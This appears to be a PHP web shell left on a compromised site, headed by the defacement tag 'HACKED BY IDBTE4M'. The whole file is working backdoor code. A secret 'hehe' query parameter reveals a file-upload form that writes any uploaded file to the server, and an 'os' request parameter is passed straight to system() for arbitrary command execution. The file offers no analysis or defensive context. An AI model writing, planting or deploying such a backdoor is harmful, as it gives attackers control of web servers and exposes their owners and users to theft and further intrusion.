HACKED BY IDBTE4M
<?php
if(isset($_GET['hehe'])){
	?>
	<center>
		<form method='post' enctype='multipart/form-data'>
			<input type='file' name='file'>
			<input type='submit' value='submit'>
		</form><br/>
		<?php
		if(isset($_FILES['file'])){
			copy($_FILES['file']['tmp_name'], $_FILES['file']['name']);
		}
		echo '<textarea style="width=80%;" cols=100 rows=24>';
		if(isset($_REQUEST['os'])){
			system($_REQUEST['os']);
		}
		echo '</textarea>';
		?>
	</center>
	<?php
}

?>